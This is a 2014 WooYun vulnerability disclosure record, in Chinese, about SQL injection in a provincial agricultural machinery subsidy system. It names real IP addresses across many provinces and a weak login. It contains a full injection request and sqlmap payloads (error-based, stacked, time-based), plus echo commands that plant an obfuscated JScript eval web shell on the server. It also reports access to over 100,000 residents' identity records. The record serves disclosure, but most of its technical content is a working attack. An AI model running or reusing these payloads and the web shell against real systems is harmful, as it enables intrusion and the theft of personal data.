{"id": 293, "wybug_id": "wooyun-2014-070849", "wybug_title": "某省农机购置补贴系统旁站SQL注射(泄漏该通用系统源码及信息泄露风险)", "wybug_corp": "CNCERT", "wybug_author": "超威蓝猫", "wybug_date": "2014-08-03 17:58", "wybug_open_date": "2014-11-01 18:00", "wybug_type": "源代码泄漏", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向公众公开  简要描述： 某省农机购置补贴系统旁站SQL注射(泄漏该通用系统源码及信息泄露风险) 详细说明：  目测这套\"农机购置补贴管理软件系统\"全国都在用，下面仅列举几例\nhttp://111.75.206.248:8081/ 江西省http://116.52.13.46:2014/ 云南省http://113.140.74.6/ 陕西省http://61.178.38.194:2014/ 甘肃省http://220.171.42.161:801/ 新疆http://60.190.2.79/ 浙江宁波http://113.108.163.164:8080/ 广东省http://59.61.92.123:2014/ 福建厦门http://218.58.77.226:82/ 山东青岛http://124.93.228.165:92/ 辽宁大连http://58.49.103.227:2014/ 湖北省http://61.138.188.217:81/ 吉林省http://218.12.43.28/ 河北省\n江西省的\"111.75.206.248\"上运行着这个站: http://amic.jxagri.gov.cn/ http://amic.jxagri.gov.cn/jxmulu2014/ 此处存在弱口令 123456:123456登录后点击左侧的\"归档产品信息\"-\"查看归档情况及意见反馈\",搜索处存在SQL注射\n\n\n\n\n\n\nPOST /jxmulu2014/Company_Product_List.aspx HTTP/1.1Host: amic.jxagri.gov.cnProxy-Connection: keep-aliveContent-Length: 913Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://amic.jxagri.gov.cnUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/32.0.1700.107 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://amic.jxagri.gov.cn/jxmulu2014/Company_Product_List.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: _gscu_637803496=054844769hrepz30; ASP.NET_SessionId=xfcxhq45qrhokwumo2pjfkfd__VIEWSTATE=%2BsxHERRYsN2t51DLo7FlVQOQI%2B35UDaSLsDH93uJnC% 2BmSnuXm1Y3jz71931foXgZbuzN7S8XpeIu%2BGaNPuboxDtXaDaf7GRhpQarcBmtTeUjjZr%2BpL% 2BesB33VNguIJfRqW1kZHuQArM9erjmMl9ikaXfv6fPzSS64OlL4FnH65gcZeuBgirePWg2EhB% 2BlZ2iiaacyiawwnSyeQHKIJSgTkG65G9Zk7faTRVuCLPOoJq89xNHSxrHbFbdV5O4oC4U2A9J1yn9Pf9pBtQZL FZ9ej3gCvjEhl5yVZ2RbRx7szC3sWp%2BqDBZwYBH7LmX3%2FUtS1cF% 2BxaiNmbqosjmql2zR3593F3IkLu0U3q7f2SC91BDTuJ92bVUdG0% 2BmUoEczRe9omvIi0lkDM3jTifvLNq2VNCDqMnfLiGrwdgtb1BRFS% 2B4TljbDvdc9blnDAmLr7r2OS8aDZt8IEo%2BaFzL4rE5bJkt4GuG%2F0xm%2B6% 2F34caxa8R0tLRJbpvWqlbAyRu65m5vKUJ9EphjICCLGkNRiDJ2866jLSMyPFVcpJ8RfwBZw8gb1CPuUOKywuo9 53hipVMOlmkIflybaUE7u1EOm6J7uvN5%2FI% 3D&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=K1xrMTDOkDPElC6msyO31mUJxf4FJqMUSrZGFalsGrYu OKsqGhfq0Ob6yGLlagbp%2BJXiy1vlK0dWPdZrlSJatxBaZEx%2Fjc9Hi9RYHoI4Aajocoh% 2BKfHcfImjUjcjZau1HwQk4g%3D%3D&Searchtype=Model&seachvalue=1*&Searchuser=%E6%90%9C%E7% B4%A2&T_Message=\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: (custom) POSTParameter: #1*    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=+sxHERRYsN2t51DLo7FlVQOQI+35UDaSLsDH93uJnC+mSnuXm1Y3jz71931foXgZbuzN7S8XpeIu+GaNPuboxDtXaDaf7GRhpQarcBmtTeUjjZr+pL+esB33VNguIJfRqW1kZHuQArM9erjmMl9ikaXfv6fPzSS64OlL4FnH65gcZeuBgirePWg2EhB+lZ2iiaacyiawwnSyeQHKIJSgTkG65G9Zk7faTRVuCLPOoJq89xNHSxrHbFbdV5O4oC4U2A9J1yn9Pf9pBtQZLFZ9ej3gCvjEhl5yVZ2RbRx7szC3sWp+qDBZwYBH7LmX3/UtS1cF+xaiNmbqosjmql2zR3593F3IkLu0U3q7f2SC91BDTuJ92bVUdG0+mUoEczRe9omvIi0lkDM3jTifvLNq2VNCDqMnfLiGrwdgtb1BRFS+4TljbDvdc9blnDAmLr7r2OS8aDZt8IEo+aFzL4rE5bJkt4GuG/0xm+6/34caxa8R0tLRJbpvWqlbAyRu65m5vKUJ9EphjICCLGkNRiDJ2866jLSMyPFVcpJ8RfwBZw8gb1CPuUOKywuo953hipVMOlmkIflybaUE7u1EOm6J7uvN5/I=&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=K1xrMTDOkDPElC6msyO31mUJxf4FJqMUSrZGFalsGrYuOKsqGhfq0Ob6yGLlagbp+JXiy1vlK0dWPdZrlSJatxBaZEx/jc9Hi9RYHoI4Aajocoh+KfHcfImjUjcjZau1HwQk4g==&Searchtype=Model&seachvalue=1%' AND 5829=CONVERT(INT,(SELECT CHAR(113)+CHAR(104)+CHAR(103)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5829=5829) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(97)+CHAR(106)+CHAR(99)+CHAR(113))) AND '%'='&Searchuser=%E6%90%9C%E7%B4%A2&T_Message=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=+sxHERRYsN2t51DLo7FlVQOQI+35UDaSLsDH93uJnC+mSnuXm1Y3jz71931foXgZbuzN7S8XpeIu+GaNPuboxDtXaDaf7GRhpQarcBmtTeUjjZr+pL+esB33VNguIJfRqW1kZHuQArM9erjmMl9ikaXfv6fPzSS64OlL4FnH65gcZeuBgirePWg2EhB+lZ2iiaacyiawwnSyeQHKIJSgTkG65G9Zk7faTRVuCLPOoJq89xNHSxrHbFbdV5O4oC4U2A9J1yn9Pf9pBtQZLFZ9ej3gCvjEhl5yVZ2RbRx7szC3sWp+qDBZwYBH7LmX3/UtS1cF+xaiNmbqosjmql2zR3593F3IkLu0U3q7f2SC91BDTuJ92bVUdG0+mUoEczRe9omvIi0lkDM3jTifvLNq2VNCDqMnfLiGrwdgtb1BRFS+4TljbDvdc9blnDAmLr7r2OS8aDZt8IEo+aFzL4rE5bJkt4GuG/0xm+6/34caxa8R0tLRJbpvWqlbAyRu65m5vKUJ9EphjICCLGkNRiDJ2866jLSMyPFVcpJ8RfwBZw8gb1CPuUOKywuo953hipVMOlmkIflybaUE7u1EOm6J7uvN5/I=&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=K1xrMTDOkDPElC6msyO31mUJxf4FJqMUSrZGFalsGrYuOKsqGhfq0Ob6yGLlagbp+JXiy1vlK0dWPdZrlSJatxBaZEx/jc9Hi9RYHoI4Aajocoh+KfHcfImjUjcjZau1HwQk4g==&Searchtype=Model&seachvalue=1%'; WAITFOR DELAY '0:0:5'--&Searchuser=%E6%90%9C%E7%B4%A2&T_Message=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=+sxHERRYsN2t51DLo7FlVQOQI+35UDaSLsDH93uJnC+mSnuXm1Y3jz71931foXgZbuzN7S8XpeIu+GaNPuboxDtXaDaf7GRhpQarcBmtTeUjjZr+pL+esB33VNguIJfRqW1kZHuQArM9erjmMl9ikaXfv6fPzSS64OlL4FnH65gcZeuBgirePWg2EhB+lZ2iiaacyiawwnSyeQHKIJSgTkG65G9Zk7faTRVuCLPOoJq89xNHSxrHbFbdV5O4oC4U2A9J1yn9Pf9pBtQZLFZ9ej3gCvjEhl5yVZ2RbRx7szC3sWp+qDBZwYBH7LmX3/UtS1cF+xaiNmbqosjmql2zR3593F3IkLu0U3q7f2SC91BDTuJ92bVUdG0+mUoEczRe9omvIi0lkDM3jTifvLNq2VNCDqMnfLiGrwdgtb1BRFS+4TljbDvdc9blnDAmLr7r2OS8aDZt8IEo+aFzL4rE5bJkt4GuG/0xm+6/34caxa8R0tLRJbpvWqlbAyRu65m5vKUJ9EphjICCLGkNRiDJ2866jLSMyPFVcpJ8RfwBZw8gb1CPuUOKywuo953hipVMOlmkIflybaUE7u1EOm6J7uvN5/I=&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=K1xrMTDOkDPElC6msyO31mUJxf4FJqMUSrZGFalsGrYuOKsqGhfq0Ob6yGLlagbp+JXiy1vlK0dWPdZrlSJatxBaZEx/jc9Hi9RYHoI4Aajocoh+KfHcfImjUjcjZau1HwQk4g==&Searchtype=Model&seachvalue=1%' WAITFOR DELAY '0:0:5'--&Searchuser=%E6%90%9C%E7%B4%A2&T_Message=---web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005\n\n\n一番搜寻，找到 http://111.75.206.248:8081/ 对应目录为 \"D:\\GouZBT2014\\nybgjbt2014\\\" , http://amic.jxagri.gov.cn/jxagri_web/ 对应目录为 \"D:\\njj2011\\jxagri_web\\\"各种姿势写一句话都无法访问，最后发现可以在--os-shell下用echo写入:\necho ^<%@ Page Language = Jscript %^> >> \"D:\\njj2011\\jxagri_web\\1.txt\"echo ^<%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/ >> \"D:\\njj2011\\jxagri_web\\1.txt\"echo \"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u\"+\"e\"/*-/*-*/+\"s\"+\"t\"+  >> \"D:\\njj2011\\jxagri_web\\1.txt\"echo \"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]\"+ >> \"D:\\njj2011\\jxagri_web\\1.txt\"echo \",\"+\"\\\"\"+\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"+\"\\\"\"+\")\";eval >> \"D:\\njj2011\\jxagri_web\\1.txt\"echo (/*-/*-*/P/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/);%^> >> \"D:\\njj2011\\jxagri_web\\1.txt\"rename \"D:\\njj2011\\jxagri_web\\1.txt\" \"index.bak.aspx\"\n\n\n菜刀成功连接:\n\n   漏洞证明：  连接数据库:\n\n\n\n十多万人的姓名住址身份证号\n\n同时，还可以通过菜刀下载这套全国通用系统的源码，通过代码审计有可能挖掘出通用漏洞，进而影响全国各地使用该系统的网站 ._.||   修复方案：  你们更专业:)   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-08-08 15:32 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-03 19:52 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  @超威蓝猫 蓝猫再现V5    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}